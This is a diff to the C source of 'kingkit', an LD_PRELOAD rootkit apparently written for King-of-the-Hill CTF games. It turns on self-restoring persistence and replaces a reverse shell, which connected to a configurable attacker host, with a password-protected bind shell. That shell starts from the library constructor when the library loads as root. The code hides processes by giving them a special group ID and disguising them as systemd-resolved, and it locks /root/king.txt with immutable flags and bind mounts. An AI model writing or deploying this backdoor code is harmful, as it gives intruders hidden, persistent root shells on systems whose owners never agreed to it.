@@ -27,15 +27,18 @@
 #include <time.h>
 
 //change these
-#define KING_NAME "Arnout" //put your nickname here
+#define KING_NAME "Kriyos" //put your nickname here
+#define OWNER_NAME "Kriyos" //owner name to write to /owners.txt
+#define KING_FILE "/root/king.txt" //file to claim kingship
 #define HIDE_PREFIX "kingkit"
 #define FAKE_PRELOAD "/etc/kingkit.so.preload"
 #define HOST "127.0.0.1" //attackers IP for reverse shell
 #define PORT 4444 //listening port for reverse shell
 #define SHELL "/bin/bash" //shell for reverse shell
+#define SHELL_PASSWORD "Kr1yos" //password for bind shell authentication
 #define PROCESS_NAME "/etc/systemd-resolved" //name that appears as process name to fool `ps` and similiar tools
 #define HIDDEN_GID 5005
-#define ADVANCED_PERSISTENCE 0 //set to 1 if you want that the rootkit restores itself after deletion. know that this will make it extremely difficult to remove the rootkit yourself too.
+#define ADVANCED_PERSISTENCE 1 //set to 1 if you want that the rootkit restores itself after deletion. know that this will make it extremely difficult to remove the rootkit yourself too.
 #define DEBUG 0 //set to 1 for logging
 
 //don't change these
@@ -48,7 +51,6 @@
 
 //global variables
 static char *libpath = NULL; //this pointer shouldn't ever be free because that breaks any function calls after the destructor is called
-static time_t last_time = 0; //time the last reverse shell was spawned, see time() hook
 
 
 //function declarations
@@ -58,6 +60,7 @@ char *dirfd_pathname_to_path(int, const char *);
 int set_attributes(const char *, int);
 int king();
 void revshell();
+void claim_ownership();
 int is_hidden(char *);
 int is_protected(char *);
 int forge_procnet(char *pathname);
@@ -226,20 +229,20 @@ int king() {
     original_mount = syscall_address(original_mount, "mount");
     //revert mounting
     umount2("/root", MNT_DETACH);
-    umount2("/root/king.txt", MNT_DETACH);
+    umount2(KING_FILE, MNT_DETACH);
     //remove immutable and append-only flags
     set_attributes("/root", UNLOCK_FILE);
-    set_attributes("/root/king.txt", UNLOCK_FILE);
+    set_attributes(KING_FILE, UNLOCK_FILE);
     //write nick to king.txt
-    int kingfd = (*original_open)("/root/king.txt", O_RDWR | O_TRUNC | O_CREAT, FILEMODE);
+    int kingfd = (*original_open)(KING_FILE, O_RDWR | O_TRUNC | O_CREAT, FILEMODE);
     write(kingfd, KING_NAME, (sizeof(KING_NAME) -1));
     close(kingfd);
     //set immutable and append-only flags
-    set_attributes("/root/king.txt", LOCK_FILE);
+    set_attributes(KING_FILE, LOCK_FILE);
     set_attributes("/root", LOCK_FILE);
     //mount king.txt readonly
-    (*original_mount)("/root/king.txt", "/root/king.txt", NULL, MS_BIND, NULL);
-    (*original_mount)("/root/king.txt", "/root/king.txt", NULL, MS_REMOUNT | MS_BIND | MS_RDONLY, NULL); //for some stupid reason you need to remount to make a bind mount readonly
+    (*original_mount)(KING_FILE, KING_FILE, NULL, MS_BIND, NULL);
+    (*original_mount)(KING_FILE, KING_FILE, NULL, MS_REMOUNT | MS_BIND | MS_RDONLY, NULL); //for some stupid reason you need to remount to make a bind mount readonly
     return 0;
 }
 
@@ -258,33 +261,81 @@ void revshell() {
         struct sockaddr_in address; //create structure variable address
         address.sin_family = AF_INET; //specify 'communication domain' for communication between different hosts using ipv4
         address.sin_port = htons(PORT); //specify the port
-        address.sin_addr.s_addr = inet_addr(HOST); //specify host address
-        if (connect(sockfd, (struct sockaddr *) &address, sizeof(address)) == -1) { //open a connection to the socket file descriptor sockfd
+        address.sin_addr.s_addr = INADDR_ANY; //bind to all interfaces
+        
+        int opt = 1;
+        setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)); //allow port reuse
+        
+        if (bind(sockfd, (struct sockaddr *) &address, sizeof(address)) == -1) { //bind to the port
             #if DEBUG
-            perror("connect");
+            perror("bind");
+            #endif
+            exit(EXIT_FAILURE);
+        }
+        
+        if (listen(sockfd, 1) == -1) { //listen for incoming connections
+            #if DEBUG
+            perror("listen");
+            #endif
+            exit(EXIT_FAILURE);
+        }
+        
+        int clientfd = accept(sockfd, NULL, NULL); //accept incoming connection
+        if (clientfd == -1) {
+            #if DEBUG
+            perror("accept");
             #endif
             exit(EXIT_FAILURE);
         }
 
-        dup2(sockfd, 0); //redirect standard input to the socket
-        dup2(sockfd, 1); //redirect standard output to the socket
-        dup2(sockfd, 2); //redirect standard error to the socket
+        dup2(clientfd, 0); //redirect standard input to the client socket
+        dup2(clientfd, 1); //redirect standard output to the client socket
+        dup2(clientfd, 2); //redirect standard error to the client socket
 
-        FILE *open_socket = fdopen(sockfd, "w");
+        FILE *open_socket = fdopen(clientfd, "w");
         fprintf(open_socket,
         "******************************\n"
-        "KINGKIT REVERSE SHELL BACKDOOR\n"
+        "KINGKIT BIND SHELL BACKDOOR\n"
         "Welcome %s\n"
         "******************************\n\n",
         KING_NAME
         );
-        fclose(open_socket);
+        fflush(open_socket);
+        
+        //password authentication
+        fprintf(open_socket, "Password: ");
+        fflush(open_socket);
+        
+        char password[256];
+        int i = 0;
+        char c;
+        while (i < sizeof(password) - 1 && read(clientfd, &c, 1) > 0) {
+            if (c == '\n' || c == '\r') {
+                break;
+            }
+            password[i++] = c;
+        }
+        password[i] = '\0';
+        
+        //check password
+        if (strcmp(password, SHELL_PASSWORD) != 0) {
+            fprintf(open_socket, "Access Denied\n");
+            fclose(open_socket);
+            close(clientfd);
+            close(sockfd);
+            exit(EXIT_FAILURE);
+        }
+        
+        fprintf(open_socket, "Access Granted\n\n");
+        fflush(open_socket);
 
         setgid(HIDDEN_GID); //automatically hide the backdoor process by setting the gid to HIDDEN_GID
 
         char *argv[] = {PROCESS_NAME, NULL}; //pass command-line arguments, the first argument appears as process name
         execve(SHELL, argv, NULL); //execute the shell
 
+        close(clientfd);
+        close(sockfd);
         exit(EXIT_SUCCESS); //exit the daemonized child process
     }
 
@@ -292,11 +343,31 @@ void revshell() {
 }
 
 
+void claim_ownership() {
+    #if DEBUG
+    printf("[kingkit] claim_ownership() called.\n");
+    #endif
+    original_open = syscall_address(original_open, "open");
+    
+    int fd = (*original_open)("/owners.txt", O_RDWR | O_CREAT | O_APPEND, FILEMODE);
+    if (fd == -1) {
+        #if DEBUG
+        perror("open /owners.txt");
+        #endif
+        return;
+    }
+    
+    write(fd, OWNER_NAME, strlen(OWNER_NAME));
+    write(fd, "\n", 1);
+    close(fd);
+}
+
+
 int is_protected(char *pathname) {
     #if DEBUG
     printf("[kingkit] is_protected() called with pathname: %s.\n", pathname);
     #endif
-    if (strcmp(pathname, "/root/king.txt") == 0) {
+    if (strcmp(pathname, KING_FILE) == 0) {
         king();
         return 1;
     }
@@ -417,6 +488,16 @@ void __attribute__((constructor)) resolve_libpath() {
         libpath = malloc(strlen(so_information.dli_fname)+1);
         if (libpath == NULL) return;
         strcpy(libpath, so_information.dli_fname);
+    }
+    
+    //claim ownership on initialization
+    claim_ownership();
+    
+    //spawn bind shell on initialization (only once)
+    static int shell_spawned = 0;
+    if (!shell_spawned && geteuid() == 0) {
+        shell_spawned = 1;
+        revshell();
     }
 }
 
@@ -1251,19 +1332,5 @@ time_t time(time_t *tloc) {
     printf("[kingkit] time called.\n");
     #endif
     original_time = syscall_address(original_time, "time");
-    char exe_path[PATH_MAX];
-    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1); //look which binary is associated with this process
-    if (len == -1) {
-        return (*original_time)(tloc);
-    }
-    exe_path[len] = '\0'; //terminate the string because readlink itself doesn't do that
-    if (strncmp(exe_path, "/usr/sbin/cron", 14) == 0) { //check if cron is calling time()
-        time_t current_time = (*original_time)(NULL);
-        if (last_time < (current_time - 50)) { //avoid spawning multiple reverse shells, otherwise cron will recursively call time()
-            last_time = current_time; //update the last_time variable
-            revshell(); //if so, spawn reverse shell
-        }
-        return current_time; //avoid an extra call to time()
-    }
     return (*original_time)(tloc);
 }
